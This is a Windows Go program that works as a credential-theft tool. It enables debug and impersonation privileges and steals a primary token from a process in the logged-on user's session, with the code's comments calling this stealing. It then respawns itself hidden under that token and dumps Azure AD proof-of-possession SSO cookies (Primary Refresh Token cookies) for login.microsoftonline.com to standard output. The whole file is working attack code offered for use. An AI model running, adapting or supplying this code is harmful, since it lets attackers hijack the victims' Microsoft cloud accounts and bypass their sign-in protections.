//go:build windows

package main

import (
	"fmt"
	"io"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// {A9927F85-A304-4390-8B23-A75F1C668600}
var clsidPoPCookieInfoManager = windows.GUID{
	Data1: 0xA9927F85,
	Data2: 0xA304,
	Data3: 0x4390,
	Data4: [8]byte{0x8B, 0x23, 0xA7, 0x5F, 0x1C, 0x66, 0x86, 0x00},
}

// {CDAECE56-4EDF-43DF-B113-88E4556FA1BB}
var iidIProofOfPossessionCookieInfoManager = windows.GUID{
	Data1: 0xCDAECE56,
	Data2: 0x4EDF,
	Data3: 0x43DF,
	Data4: [8]byte{0xB1, 0x13, 0x88, 0xE4, 0x55, 0x6F, 0xA1, 0xBB},
}

type proofOfPossessionCookieInfo struct {
	Name      *uint16
	Data      *uint16
	Flags     uint32
	P3PHeader *uint16
}

type iProofOfPossessionCookieInfoManagerVtbl struct {
	QueryInterface      uintptr
	AddRef              uintptr
	Release             uintptr
	GetCookieInfoForUri uintptr
}

type iProofOfPossessionCookieInfoManager struct {
	vtbl *iProofOfPossessionCookieInfoManagerVtbl
}

func (m *iProofOfPossessionCookieInfoManager) getCookieInfoForUri(uri *uint16, count *uint32, cookies **proofOfPossessionCookieInfo) uint32 {
	r, _, _ := syscall.SyscallN(
		m.vtbl.GetCookieInfoForUri,
		uintptr(unsafe.Pointer(m)),
		uintptr(unsafe.Pointer(uri)),
		uintptr(unsafe.Pointer(count)),
		uintptr(unsafe.Pointer(cookies)),
	)
	return uint32(r)
}

func (m *iProofOfPossessionCookieInfoManager) release() {
	syscall.SyscallN(m.vtbl.Release, uintptr(unsafe.Pointer(m)))
}

var (
	ole32    = windows.NewLazySystemDLL("ole32.dll")
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	advapi32 = windows.NewLazySystemDLL("advapi32.dll")

	procCoInitEx  = ole32.NewProc("CoInitializeEx")
	procCoCreate  = ole32.NewProc("CoCreateInstance")
	procCoMemFree = ole32.NewProc("CoTaskMemFree")

	procGetConsoleSession       = kernel32.NewProc("WTSGetActiveConsoleSessionId")
	procProcessToSessionId      = kernel32.NewProc("ProcessIdToSessionId")
	procCreateProcessWithToken  = advapi32.NewProc("CreateProcessWithTokenW")
	procLookupPrivilegeValue    = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges   = advapi32.NewProc("AdjustTokenPrivileges")
)

type luidAndAttributes struct {
	Luid       windows.LUID
	Attributes uint32
}

type tokenPrivileges1 struct {
	PrivilegeCount uint32
	Privileges     [1]luidAndAttributes
}

func enablePrivilege(name string) {
	namePtr, _ := windows.UTF16PtrFromString(name)
	var luid windows.LUID
	procLookupPrivilegeValue.Call(0, uintptr(unsafe.Pointer(namePtr)), uintptr(unsafe.Pointer(&luid)))

	tp := tokenPrivileges1{PrivilegeCount: 1}
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = 0x2 // SE_PRIVILEGE_ENABLED

	var tok windows.Token
	proc, _ := windows.GetCurrentProcess()
	windows.OpenProcessToken(proc, windows.TOKEN_ADJUST_PRIVILEGES, &tok)
	defer tok.Close()

	procAdjustTokenPrivileges.Call(
		uintptr(tok), 0,
		uintptr(unsafe.Pointer(&tp)),
		uintptr(unsafe.Sizeof(tp)),
		0, 0,
	)
}

func failed(hr uint32) bool { return hr&0x80000000 != 0 }

func coTaskMemFree(p unsafe.Pointer) { procCoMemFree.Call(uintptr(p)) }

func activeConsoleSession() uint32 {
	r, _, _ := procGetConsoleSession.Call()
	return uint32(r)
}

func pidSession(pid uint32) (uint32, error) {
	var sid uint32
	r, _, err := procProcessToSessionId.Call(uintptr(pid), uintptr(unsafe.Pointer(&sid)))
	if r == 0 {
		return 0, err
	}
	return sid, nil
}

// primaryTokenForSession finds a process in targetSession and returns a duplicated primary token.
func primaryTokenForSession(targetSession uint32) (windows.Token, error) {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snap)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	if err := windows.Process32First(snap, &entry); err != nil {
		return 0, err
	}
	for {
		pid := entry.ProcessID
		if pid != 0 && pid != 4 {
			if sid, err := pidSession(pid); err == nil && sid == targetSession {
				proc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
				if err == nil {
					var tok windows.Token
					err = windows.OpenProcessToken(proc, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &tok)
					windows.CloseHandle(proc)
					if err == nil {
						var primary windows.Token
						err = windows.DuplicateTokenEx(tok, windows.TOKEN_ALL_ACCESS, nil,
							windows.SecurityImpersonation, windows.TokenPrimary, &primary)
						tok.Close()
						if err == nil {
							return primary, nil
						}
					}
				}
			}
		}
		if err := windows.Process32Next(snap, &entry); err != nil {
			break
		}
	}
	return 0, fmt.Errorf("no accessible process in session %d", targetSession)
}

func dumpPRT(w io.Writer, uri string) {
	uriPtr, err := windows.UTF16PtrFromString(uri)
	if err != nil {
		fmt.Fprintf(w, "UTF16 error: %v\n", err)
		return
	}

	r, _, _ := procCoInitEx.Call(0, 0)
	hr := uint32(r)
	if hr == 0x80010106 {
		r, _, _ = procCoInitEx.Call(0, 2)
		hr = uint32(r)
	}
	if failed(hr) {
		fmt.Fprintf(w, "CoInitialize error: 0x%08x\n", hr)
		return
	}

	var manager *iProofOfPossessionCookieInfoManager
	r, _, _ = procCoCreate.Call(
		uintptr(unsafe.Pointer(&clsidPoPCookieInfoManager)),
		0, 0x1,
		uintptr(unsafe.Pointer(&iidIProofOfPossessionCookieInfoManager)),
		uintptr(unsafe.Pointer(&manager)),
	)
	hr = uint32(r)
	if failed(hr) {
		fmt.Fprintf(w, "CoCreateInstance error: 0x%08x\n", hr)
		return
	}
	defer manager.release()

	var cookieCount uint32
	var cookies *proofOfPossessionCookieInfo
	hr = manager.getCookieInfoForUri(uriPtr, &cookieCount, &cookies)
	if failed(hr) {
		fmt.Fprintf(w, "GetCookieInfoForUri error: 0x%08x\n", hr)
		return
	}
	if cookieCount == 0 {
		fmt.Fprintln(w, "No cookies for the URI")
		return
	}

	for _, c := range unsafe.Slice(cookies, cookieCount) {
		fmt.Fprintf(w, "Name: %s\n", windows.UTF16PtrToString(c.Name))
		fmt.Fprintf(w, "Data: %s\n", windows.UTF16PtrToString(c.Data))
		fmt.Fprintf(w, "Flags: %x\n", c.Flags)
		fmt.Fprintf(w, "P3PHeader: %s\n\n", windows.UTF16PtrToString(c.P3PHeader))
		coTaskMemFree(unsafe.Pointer(c.Name))
		coTaskMemFree(unsafe.Pointer(c.Data))
		coTaskMemFree(unsafe.Pointer(c.P3PHeader))
	}
	coTaskMemFree(unsafe.Pointer(cookies))
	fmt.Fprintln(w, "DONE")
}

// spawnInSession launches this binary as --child in the given token's session,
// capturing stdout via an anonymous pipe.
func spawnInSession(token windows.Token, nonce string) error {
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("Executable: %w", err)
	}

	var cmdLine string
	if nonce != "" {
		cmdLine = fmt.Sprintf(`"%s" --child "%s"`, exePath, nonce)
	} else {
		cmdLine = fmt.Sprintf(`"%s" --child`, exePath)
	}
	cmdLineUTF16, _ := windows.UTF16FromString(cmdLine)

	// Pipe: write end is inheritable so the child writes to it
	sa := windows.SecurityAttributes{
		Length:        uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		InheritHandle: 1,
	}
	var readEnd, writeEnd windows.Handle
	if err := windows.CreatePipe(&readEnd, &writeEnd, &sa, 0); err != nil {
		return fmt.Errorf("CreatePipe: %w", err)
	}
	// Read end must NOT be inherited
	windows.SetHandleInformation(readEnd, windows.HANDLE_FLAG_INHERIT, 0)
	defer windows.CloseHandle(readEnd)

	si := windows.StartupInfo{
		Cb:        uint32(unsafe.Sizeof(windows.StartupInfo{})),
		Flags:     windows.STARTF_USESTDHANDLES,
		StdOutput: writeEnd,
		StdErr:    writeEnd,
	}
	var pi windows.ProcessInformation

	const (
		logonWithProfile = 0x1
		createNoWindow   = 0x08000000
	)

	r, _, sysErr := procCreateProcessWithToken.Call(
		uintptr(token),
		logonWithProfile,
		0,
		uintptr(unsafe.Pointer(&cmdLineUTF16[0])),
		createNoWindow,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	// Close write end immediately — when child exits, ReadFile will return EOF
	windows.CloseHandle(writeEnd)
	if r == 0 {
		return fmt.Errorf("CreateProcessWithTokenW: %w", sysErr)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	buf := make([]byte, 4096)
	for {
		var n uint32
		err := windows.ReadFile(readEnd, buf, &n, nil)
		if n > 0 {
			os.Stdout.Write(buf[:n])
		}
		if err != nil {
			break
		}
	}
	windows.WaitForSingleObject(pi.Process, windows.INFINITE)
	return nil
}

func main() {
	// Child mode: running inside session 1 under the user's token
	if len(os.Args) >= 2 && os.Args[1] == "--child" {
		nonce := ""
		if len(os.Args) >= 3 {
			nonce = os.Args[2]
		}
		var uri string
		if nonce != "" {
			uri = "https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=" + nonce
		} else {
			uri = "https://login.microsoftonline.com/"
		}
		fmt.Printf("Using uri: %s\n", uri)
		dumpPRT(os.Stdout, uri)
		return
	}

	// Parent mode: steal primary token from session 1, relaunch self inside it
	nonce := ""
	if len(os.Args) == 2 {
		nonce = os.Args[1]
	}

	enablePrivilege("SeImpersonatePrivilege")
	enablePrivilege("SeDebugPrivilege")

	session := activeConsoleSession()
	fmt.Printf("Active console session: %d\n", session)

	token, err := primaryTokenForSession(session)
	if err != nil {
		fmt.Fprintf(os.Stderr, "primaryTokenForSession: %v\n", err)
		os.Exit(1)
	}
	defer token.Close()

	fmt.Println("Spawning child in user session...")
	if err := spawnInSession(token, nonce); err != nil {
		fmt.Fprintf(os.Stderr, "spawnInSession: %v\n", err)
		os.Exit(1)
	}
}
